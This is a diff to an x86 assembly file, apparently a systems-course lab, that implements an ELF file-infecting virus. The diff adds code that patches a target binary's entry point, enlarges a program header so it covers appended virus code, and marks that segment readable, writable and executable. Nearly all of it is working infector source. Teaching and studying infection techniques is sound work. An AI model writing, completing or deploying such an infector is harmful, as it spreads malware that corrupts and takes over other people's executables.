@@ -53,6 +53,7 @@
 %define	PHDR_size	32
 %define PHDR_memsize	20	
 %define PHDR_filesize	16
+%define PHDR_flags 24
 %define	PHDR_offset	4
 %define	PHDR_vaddr	8
 %define ELFHD_OFFSET 64
@@ -67,6 +68,7 @@
 %define PHD_OFFSET 104
 %define PHD_STACK_OFFSET(i) (PHD_OFFSET - i)
 %define ORIG_ENTRY_POINT_OFF 72
+%define PF_X_PF_W_PF_R 0x7
 
 	
 	global _start
@@ -76,7 +78,6 @@ _start:	push	ebp
 	mov	ebp, esp
 	sub	esp, STK_RES            ; Set up ebp and reserve space on the stack for local storage
 	
-
 ; You code for this lab goes here
 	get_loc OutStr
 	write 1, [ebp - LABEL_OFF], 32
@@ -116,18 +117,17 @@ _start:	push	ebp
 	lea ecx, [ebp - ELFH_STACK_OFF(ENTRY)]
 	write [ebp - FILE_DESC_OFF], ecx, 4
 
-
 	mov ecx, [ebp - ELFH_STACK_OFF(PHDR_start)]
 	lseek [ebp - FILE_DESC_OFF], ecx, SEEK_SET
 	lea ecx, [ebp - PHD_OFFSET]
 	read [ebp - FILE_DESC_OFF], ecx, PHDR_size
 
-
-	mov eax, dword [ebp - PHD_STACK_OFFSET(PHDR_vaddr)]
-	mov dword [ebp - ORIG_ENTRY_POINT_OFF], eax
-
 	lea ecx, [ebp - PHD_OFFSET]
 	read [ebp - FILE_DESC_OFF], ecx, PHDR_size
+
+	mov eax, dword [ebp - PHD_STACK_OFFSET(PHDR_vaddr)]
+	sub eax, dword [ebp - PHD_STACK_OFFSET(PHDR_offset)]
+	mov dword [ebp - ORIG_ENTRY_POINT_OFF], eax
 
 	mov ecx, [ebp - FILE_SIZE]
 	get_loc virus_end
@@ -137,12 +137,13 @@ _start:	push	ebp
 	sub ecx, dword [ebp - PHD_STACK_OFFSET(PHDR_offset)]
 	mov dword [ebp - PHD_STACK_OFFSET(PHDR_filesize)], ecx
 	mov dword [ebp - PHD_STACK_OFFSET(PHDR_memsize)], ecx
+	mov dword [ebp - PHD_STACK_OFFSET(PHDR_flags)], PF_X_PF_W_PF_R
 
 	mov ecx, dword [ebp - ELFH_STACK_OFF(PHDR_start)]
 	add ecx, PHDR_size
 	lseek [ebp - FILE_DESC_OFF], ecx, SEEK_SET
 	lea ecx, [ebp - PHD_OFFSET]
-	write [ebp - FILE_DESC_OFF], ecx, 32
+	write [ebp - FILE_DESC_OFF], ecx, PHDR_size
 
 	mov eax, dword [ebp - FILE_SIZE]
 	add eax, dword [ebp - ORIG_ENTRY_POINT_OFF]
@@ -150,7 +151,6 @@ _start:	push	ebp
 	lseek [ebp - FILE_DESC_OFF], 0, SEEK_SET
 	lea ecx, [ebp - ELFHD_OFFSET]
 	write [ebp - FILE_DESC_OFF], ecx, 52
-
 
 	close [ebp - FILE_DESC_OFF]
 
@@ -163,10 +163,10 @@ virus_fail:
 	get_loc Failstr
 	write 1, [ebp - LABEL_OFF], 13
 
-	get_loc PreviousEntryPoint
-	mov eax, [ebp - LABEL_OFF]
-	mov eax, [eax]
-	jmp eax
+	; get_loc PreviousEntryPoint
+	; mov eax, [ebp - LABEL_OFF]
+	; mov eax, [eax]
+	; jmp eax
 
 VirusExit:
        exit 0            ; Termination if all is OK and no previous code to jump to
